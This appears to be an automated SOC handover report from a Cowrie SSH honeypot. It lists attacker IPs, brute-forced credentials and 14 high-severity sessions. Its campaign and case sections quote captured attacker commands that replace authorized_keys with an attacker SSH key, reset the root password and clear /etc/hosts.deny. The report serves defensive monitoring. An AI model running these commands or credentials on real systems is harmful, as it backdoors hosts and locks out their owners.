# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-30 |
| **Generated At** | 2026-03-30T05:58:11Z |
| **Shift Time** | 05:58 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **79** |
| Confirmed Threats | **75** |
| False Positives Filtered | **4** (5.1%) |
| Unique Attacker IPs | **60** |
| Countries of Origin | **29** |
| High Severity Cases | **14** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **65** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **50** |
| Unique Credential Pairs | **42** |
| Unique Usernames | **23** |
| Unique Passwords | **40** |
| Successful Auth Pairs | **14** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 14 |
| `345gs5662d34` | 5 |
| `support` | 3 |
| `Config` | 3 |
| `blank` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 5 |
| `3245gs5662d34` | 5 |
| `ubuntu` | 2 |
| `dietpi` | 2 |
| `nobody888` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 5 |
| `root` | `3245gs5662d34` | 5 |
| `nobody` | `nobody888` | 1 |
| `Unknown` | `qwerty1` | 1 |
| `test` | `6` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `connect` | `101.36.108.125` | 2026-03-30T03:32:20 |
| `root` | `3245gs5662d34` | `101.36.108.125` | 2026-03-30T03:32:23 |
| `root` | `welcome@1234` | `120.48.153.92` | 2026-03-30T04:15:53 |
| `root` | `zhang2026` | `103.172.236.15` | 2026-03-30T04:18:46 |
| `root` | `3245gs5662d34` | `103.172.236.15` | 2026-03-30T04:18:51 |
| `root` | `fjbdfdjkdsfs541544@@` | `14.29.198.63` | 2026-03-30T04:19:58 |
| `root` | `fk123456` | `43.130.90.166` | 2026-03-30T04:34:52 |
| `root` | `3245gs5662d34` | `43.130.90.166` | 2026-03-30T04:34:58 |
| `root` | `66` | `200.91.234.36` | 2026-03-30T04:50:49 |
| `root` | `ubuntu` | `20.13.147.55` | 2026-03-30T05:41:18 |
| `root` | `Q1w2e3123` | `185.213.175.140` | 2026-03-30T05:46:03 |
| `root` | `3245gs5662d34` | `185.213.175.140` | 2026-03-30T05:46:07 |
| `root` | `azerty` | `101.47.48.243` | 2026-03-30T05:50:20 |
| `root` | `3245gs5662d34` | `101.47.48.243` | 2026-03-30T05:50:23 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:YuSrUmvbwsct"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.29.198.63`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.172.236.15`, `101.47.48.243`, `43.130.90.166`, `185.213.175.140`, `101.36.108.125`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **60** |
| Unique ASNs | **51** |
| High-Risk ASNs | **47** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS46562` | Performive LLC | 2 | MEDIUM |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS45899` | VNPT Corp | 2 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 2 | HIGH |
| `AS7922` | Comcast Cable Communications, LLC | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (14)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-3a7e5478c41e

| Field | Detail |
|---|---|
| **Source IP** | `101.36.108[.]125` |
| **First Seen** | 2026-03-30 03:32 |
| **Last Seen** | 2026-03-30 03:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 03:32:19` | `cowrie.session.connect` |
| `2026-03-30 03:32:19` | `cowrie.client.version` |
| `2026-03-30 03:32:19` | `cowrie.client.kex` |
| `2026-03-30 03:32:20` | `cowrie.login.success` |
| `2026-03-30 03:32:20` | `cowrie.session.params` |
| `2026-03-30 03:32:20` | `cowrie.command.input` |
| `2026-03-30 03:32:20` | `cowrie.command.failed` |
| `2026-03-30 03:32:20` | `cowrie.log.closed` |
| `2026-03-30 03:32:21` | `cowrie.session.params` |
| `2026-03-30 03:32:21` | `cowrie.command.input` |
| `2026-03-30 03:32:21` | `cowrie.session.file_download` |
| `2026-03-30 03:32:21` | `cowrie.log.closed` |
| `2026-03-30 03:32:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.108[.]125` to AbuseIPDB if not already reported
- [ ] Block `101.36.108[.]125` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f28d55a9192

| Field | Detail |
|---|---|
| **Source IP** | `101.36.108[.]125` |
| **First Seen** | 2026-03-30 03:32 |
| **Last Seen** | 2026-03-30 03:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 03:32:22` | `cowrie.session.connect` |
| `2026-03-30 03:32:22` | `cowrie.client.version` |
| `2026-03-30 03:32:22` | `cowrie.client.kex` |
| `2026-03-30 03:32:23` | `cowrie.login.success` |
| `2026-03-30 03:32:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.108[.]125` to AbuseIPDB if not already reported
- [ ] Block `101.36.108[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11a6ae999df6

| Field | Detail |
|---|---|
| **Source IP** | `120.48.153[.]92` |
| **First Seen** | 2026-03-30 04:15 |
| **Last Seen** | 2026-03-30 04:16 |
| **Session Duration** | 51s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 04:15:48` | `cowrie.session.connect` |
| `2026-03-30 04:15:48` | `cowrie.client.version` |
| `2026-03-30 04:15:48` | `cowrie.client.kex` |
| `2026-03-30 04:15:53` | `cowrie.login.success` |
| `2026-03-30 04:16:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.153[.]92` to AbuseIPDB if not already reported
- [ ] Block `120.48.153[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f00063de754c

| Field | Detail |
|---|---|
| **Source IP** | `103.172.236[.]15` |
| **First Seen** | 2026-03-30 04:18 |
| **Last Seen** | 2026-03-30 04:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 04:18:45` | `cowrie.session.connect` |
| `2026-03-30 04:18:45` | `cowrie.client.version` |
| `2026-03-30 04:18:45` | `cowrie.client.kex` |
| `2026-03-30 04:18:46` | `cowrie.login.success` |
| `2026-03-30 04:18:46` | `cowrie.session.params` |
| `2026-03-30 04:18:46` | `cowrie.command.input` |
| `2026-03-30 04:18:46` | `cowrie.command.failed` |
| `2026-03-30 04:18:47` | `cowrie.log.closed` |
| `2026-03-30 04:18:47` | `cowrie.session.params` |
| `2026-03-30 04:18:47` | `cowrie.command.input` |
| `2026-03-30 04:18:47` | `cowrie.session.file_download` |
| `2026-03-30 04:18:47` | `cowrie.log.closed` |
| `2026-03-30 04:18:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.236[.]15` to AbuseIPDB if not already reported
- [ ] Block `103.172.236[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6730be94e67

| Field | Detail |
|---|---|
| **Source IP** | `103.172.236[.]15` |
| **First Seen** | 2026-03-30 04:18 |
| **Last Seen** | 2026-03-30 04:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 04:18:50` | `cowrie.session.connect` |
| `2026-03-30 04:18:50` | `cowrie.client.version` |
| `2026-03-30 04:18:50` | `cowrie.client.kex` |
| `2026-03-30 04:18:51` | `cowrie.login.success` |
| `2026-03-30 04:18:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.172.236[.]15` to AbuseIPDB if not already reported
- [ ] Block `103.172.236[.]15` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87ed93652c8b

| Field | Detail |
|---|---|
| **Source IP** | `14.29.198[.]63` |
| **First Seen** | 2026-03-30 04:19 |
| **Last Seen** | 2026-03-30 04:20 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:YuSrUmvbwsct"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 04:19:57` | `cowrie.session.connect` |
| `2026-03-30 04:19:57` | `cowrie.client.version` |
| `2026-03-30 04:19:57` | `cowrie.client.kex` |
| `2026-03-30 04:19:58` | `cowrie.login.success` |
| `2026-03-30 04:19:58` | `cowrie.session.params` |
| `2026-03-30 04:19:58` | `cowrie.command.input` |
| `2026-03-30 04:19:58` | `cowrie.command.failed` |
| `2026-03-30 04:19:58` | `cowrie.log.closed` |
| `2026-03-30 04:19:58` | `cowrie.session.params` |
| `2026-03-30 04:19:58` | `cowrie.command.input` |
| `2026-03-30 04:19:59` | `cowrie.session.file_download` |
| `2026-03-30 04:19:59` | `cowrie.log.closed` |
| `2026-03-30 04:20:15` | `cowrie.session.params` |
| `2026-03-30 04:20:15` | `cowrie.command.input` |
| `2026-03-30 04:20:15` | `cowrie.log.closed` |
| `2026-03-30 04:20:15` | `cowrie.session.params` |
| `2026-03-30 04:20:15` | `cowrie.command.input` |
| `2026-03-30 04:20:15` | `cowrie.log.closed` |
| `2026-03-30 04:20:16` | `cowrie.session.params` |
| `2026-03-30 04:20:16` | `cowrie.command.input` |
| `2026-03-30 04:20:16` | `cowrie.session.file_download` |
| `2026-03-30 04:20:16` | `cowrie.log.closed` |
| `2026-03-30 04:20:16` | `cowrie.session.params` |
| `2026-03-30 04:20:16` | `cowrie.command.input` |
| `2026-03-30 04:20:16` | `cowrie.log.closed` |
| `2026-03-30 04:20:17` | `cowrie.session.params` |
| `2026-03-30 04:20:17` | `cowrie.command.input` |
| `2026-03-30 04:20:17` | `cowrie.log.closed` |
| `2026-03-30 04:20:17` | `cowrie.session.params` |
| `2026-03-30 04:20:17` | `cowrie.command.input` |
| `2026-03-30 04:20:17` | `cowrie.command.input` |
| `2026-03-30 04:20:17` | `cowrie.log.closed` |
| `2026-03-30 04:20:18` | `cowrie.session.params` |
| `2026-03-30 04:20:18` | `cowrie.command.input` |
| `2026-03-30 04:20:18` | `cowrie.log.closed` |
| `2026-03-30 04:20:18` | `cowrie.session.params` |
| `2026-03-30 04:20:18` | `cowrie.command.input` |
| `2026-03-30 04:20:18` | `cowrie.log.closed` |
| `2026-03-30 04:20:18` | `cowrie.session.params` |
| `2026-03-30 04:20:18` | `cowrie.command.input` |
| `2026-03-30 04:20:19` | `cowrie.log.closed` |
| `2026-03-30 04:20:19` | `cowrie.session.params` |
| `2026-03-30 04:20:19` | `cowrie.command.input` |
| `2026-03-30 04:20:19` | `cowrie.log.closed` |
| `2026-03-30 04:20:19` | `cowrie.session.params` |
| `2026-03-30 04:20:19` | `cowrie.command.input` |
| `2026-03-30 04:20:20` | `cowrie.log.closed` |
| `2026-03-30 04:20:20` | `cowrie.session.params` |
| `2026-03-30 04:20:20` | `cowrie.command.input` |
| `2026-03-30 04:20:20` | `cowrie.log.closed` |
| `2026-03-30 04:20:20` | `cowrie.session.params` |
| `2026-03-30 04:20:20` | `cowrie.command.input` |
| `2026-03-30 04:20:20` | `cowrie.log.closed` |
| `2026-03-30 04:20:21` | `cowrie.session.params` |
| `2026-03-30 04:20:21` | `cowrie.command.input` |
| `2026-03-30 04:20:21` | `cowrie.log.closed` |
| `2026-03-30 04:20:21` | `cowrie.session.params` |
| `2026-03-30 04:20:21` | `cowrie.command.input` |
| `2026-03-30 04:20:21` | `cowrie.log.closed` |
| `2026-03-30 04:20:22` | `cowrie.session.params` |
| `2026-03-30 04:20:22` | `cowrie.command.input` |
| `2026-03-30 04:20:22` | `cowrie.log.closed` |
| `2026-03-30 04:20:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.198[.]63` to AbuseIPDB if not already reported
- [ ] Block `14.29.198[.]63` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b4fa77d9953

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-03-30 04:34 |
| **Last Seen** | 2026-03-30 04:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 04:34:51` | `cowrie.session.connect` |
| `2026-03-30 04:34:51` | `cowrie.client.version` |
| `2026-03-30 04:34:51` | `cowrie.client.kex` |
| `2026-03-30 04:34:52` | `cowrie.login.success` |
| `2026-03-30 04:34:53` | `cowrie.session.params` |
| `2026-03-30 04:34:53` | `cowrie.command.input` |
| `2026-03-30 04:34:53` | `cowrie.command.failed` |
| `2026-03-30 04:34:53` | `cowrie.log.closed` |
| `2026-03-30 04:34:53` | `cowrie.session.params` |
| `2026-03-30 04:34:53` | `cowrie.command.input` |
| `2026-03-30 04:34:54` | `cowrie.session.file_download` |
| `2026-03-30 04:34:54` | `cowrie.log.closed` |
| `2026-03-30 04:34:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c41eef19d827

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-03-30 04:34 |
| **Last Seen** | 2026-03-30 04:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 04:34:57` | `cowrie.session.connect` |
| `2026-03-30 04:34:57` | `cowrie.client.version` |
| `2026-03-30 04:34:57` | `cowrie.client.kex` |
| `2026-03-30 04:34:58` | `cowrie.login.success` |
| `2026-03-30 04:34:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00e87cb2fc6d

| Field | Detail |
|---|---|
| **Source IP** | `200.91.234[.]36` |
| **First Seen** | 2026-03-30 04:50 |
| **Last Seen** | 2026-03-30 04:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 04:50:46` | `cowrie.session.connect` |
| `2026-03-30 04:50:47` | `cowrie.client.version` |
| `2026-03-30 04:50:47` | `cowrie.client.kex` |
| `2026-03-30 04:50:49` | `cowrie.login.success` |
| `2026-03-30 04:50:50` | `cowrie.direct-tcpip.request` |
| `2026-03-30 04:50:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.91.234[.]36` to AbuseIPDB if not already reported
- [ ] Block `200.91.234[.]36` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b8f49d41171

| Field | Detail |
|---|---|
| **Source IP** | `20.13.147[.]55` |
| **First Seen** | 2026-03-30 05:41 |
| **Last Seen** | 2026-03-30 05:44 |
| **Session Duration** | 214s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 05:41:15` | `cowrie.session.connect` |
| `2026-03-30 05:41:15` | `cowrie.client.version` |
| `2026-03-30 05:41:15` | `cowrie.client.kex` |
| `2026-03-30 05:41:18` | `cowrie.login.success` |
| `2026-03-30 05:44:48` | `cowrie.session.file_upload` |
| `2026-03-30 05:44:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.13.147[.]55` to AbuseIPDB if not already reported
- [ ] Block `20.13.147[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b284ce063709

| Field | Detail |
|---|---|
| **Source IP** | `185.213.175[.]140` |
| **First Seen** | 2026-03-30 05:46 |
| **Last Seen** | 2026-03-30 05:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 05:46:03` | `cowrie.session.connect` |
| `2026-03-30 05:46:03` | `cowrie.client.version` |
| `2026-03-30 05:46:03` | `cowrie.client.kex` |
| `2026-03-30 05:46:03` | `cowrie.login.success` |
| `2026-03-30 05:46:04` | `cowrie.session.params` |
| `2026-03-30 05:46:04` | `cowrie.command.input` |
| `2026-03-30 05:46:04` | `cowrie.command.failed` |
| `2026-03-30 05:46:04` | `cowrie.log.closed` |
| `2026-03-30 05:46:04` | `cowrie.session.params` |
| `2026-03-30 05:46:04` | `cowrie.command.input` |
| `2026-03-30 05:46:04` | `cowrie.session.file_download` |
| `2026-03-30 05:46:04` | `cowrie.log.closed` |
| `2026-03-30 05:46:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.213.175[.]140` to AbuseIPDB if not already reported
- [ ] Block `185.213.175[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f5685cdcf93

| Field | Detail |
|---|---|
| **Source IP** | `185.213.175[.]140` |
| **First Seen** | 2026-03-30 05:46 |
| **Last Seen** | 2026-03-30 05:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-30 05:46:06` | `cowrie.session.connect` |
| `2026-03-30 05:46:06` | `cowrie.client.version` |
| `2026-03-30 05:46:06` | `cowrie.client.kex` |
| `2026-03-30 05:46:07` | `cowrie.login.success` |
| `2026-03-30 05:46:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.213.175[.]140` to AbuseIPDB if not already reported
- [ ] Block `185.213.175[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

